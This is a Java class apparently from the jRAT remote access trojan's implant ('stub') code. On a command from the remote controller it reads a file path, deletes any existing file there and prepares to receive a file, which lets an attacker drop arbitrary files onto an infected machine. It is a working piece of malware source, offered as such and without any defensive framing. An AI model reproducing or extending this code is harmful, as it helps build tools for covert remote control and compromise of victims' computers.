package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.stub.Connection;


public class Packet42ClientDownloadFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String f = Connection.readLine();

		File file = new File(f);

		if (file.exists() && file.isFile()) {
			file.delete();
		}

		TransferData d = new TransferData();
		d.local = file;
		FileCache.put(f, d);

	}

}
